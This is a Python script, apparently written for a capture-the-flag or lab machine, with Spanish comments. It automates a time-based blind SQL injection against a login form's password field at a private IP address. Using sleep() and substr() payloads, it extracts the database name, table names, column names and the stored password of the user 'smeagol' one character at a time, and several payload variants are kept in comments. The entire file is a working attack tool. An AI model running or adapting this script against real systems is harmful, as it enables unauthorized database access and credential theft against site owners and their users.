#!/usr/bin/python

import signal
import time
import sys
import requests
from pwn import *


def signal_handler(sig, frame):
    print '[*] Saliendo'
    sys.exit(1)

signal.signal(signal.SIGINT,signal_handler)

#if __name__ == '__main__':
#    check_payload()


url = 'http://192.168.2.11:1337/978345210/index.php'
charsall = r'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
chars = r'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
result = " "


def check_payload(payload):

    #data_post = {
    #        'username' : '%s' % payload,
    #        'password' : 'test',
    #        'submit'   : ' Login '
    #}

    data_post = {
            'username' : 'admin',
            'password' : '%s' %payload,
            'submit'   : ' Login '
    }


    time_start = time.time()
    content = requests.post(url, data=data_post )

    time_end = time.time()
    if time_end - time_start > 5:
       return 1


p1 = log.progress("Enviando SQLi")
p2 = log.progress("Payload")


#Payloads
#DATABASE = "'or if(substr(database(),%d,1)='%c',sleep(2),1)-- -"
#TABLAS = """'or if(substr((select table_name from information_schema.tables where table_schema="Webapp" limit %d,1),%d,1)='%c',sleep(2),1);-- -""" %(t,d,c)
#COLUMNAS = """'or if(substr((select column_name from information_schema.columns where table_schema="Webapp" limit %d,1),%d,1)='%c',sleep(2),1);-- -""" %(t,d,c)
#Registros =

#cantidad de registros
for t in xrange(0,6):
    p3 = log.progress("Columnas [%d]" %t) 
    #cantidad de caraceteres que pueda tener una palabra
    for d in xrange(1,30):
        #recorre todo los caracteres
        for c in chars:    
            #payload= "'or if(substr(database(),%d,1)='%c',sleep(2),1)-- -" %(d,c)
            #payload = """'or if(substr((select table_name from information_schema.tables where table_schema="WEBAPP" limit %d,1),%d,1)='%c',sleep(2),1);-- -""" %(t,d,c)
            #payload = """'or if(substr((select column_name from information_schema.columns where table_schema="Webapp" limit %d,1),%d,1)='%c',sleep(2),1);-- -""" %(t,d,c)
            #payload = """'or if (substr((select password from Users limit %d,1),%d,1) LIKE BINARY '%c',sleep(2),1);-- -""" %(t,d,c)
            payload = """'or if (substr((select password from Users where username= "smeagol" limit %d,1),%d,1) LIKE BINARY '%c',sleep(2),1);-- -""" %(t,d,c)
            p2.status("%s" %payload)
            p2.status("%s" %payload)
            if check_payload(payload):           
                result +=c
                p3.status("%s" %result)
                break
    result = ""
p1.success("%s" %result)

